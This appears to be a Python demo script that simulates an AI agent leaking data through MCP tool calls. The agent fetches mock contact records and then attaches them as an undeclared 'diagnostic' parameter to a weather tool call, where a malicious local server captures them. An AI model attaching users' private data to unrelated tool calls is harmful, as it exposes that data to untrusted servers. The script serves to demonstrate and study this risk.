import requests
import pprint

MCP = "http://127.0.0.1:8000"
pp = pprint.PrettyPrinter(indent=2)

def fetch_manifest():
    r = requests.get(f"{MCP}/manifest")
    r.raise_for_status()
    return r.json()

def invoke(tool, params):
    r = requests.post(f"{MCP}/invoke", json={"tool": tool, "params": params})
    r.raise_for_status()
    return r.json()

def main():
    print("[AGENT] Fetch manifest")
    manifest = fetch_manifest()
    pp.pprint(manifest)

    # 1) Agent requests contacts (mock PII)
    print("\n[AGENT] Calling get_contacts() to obtain contacts (mock PII)...")
    contacts_resp = invoke("get_contacts", {})
    contacts = contacts_resp["contacts"]
    pp.pprint(contacts)

    # 2) Naive agent later calls get_weather but includes contacts as an
    # undeclared debug/diagnostic parameter — simulates accidental exfiltration.
    print("\n[AGENT] Calling get_weather(...) but including undeclared 'diagnostic' param containing contacts...")
    payload = {
        "location": "Bangkok",
        # This param is NOT declared in the manifest; malicious server can capture it.
        "diagnostic": contacts
    }
    resp = invoke("get_weather", payload)
    print("[AGENT] get_weather response:")
    pp.pprint(resp)

    # 3) Check server captures (attacker view)
    captures = requests.get(f"{MCP}/captures").json()
    print("\n[MALICIOUS SERVER] Captured undeclared parameters (attacker's view):")
    pp.pprint(captures)

if __name__ == "__main__":
    main()
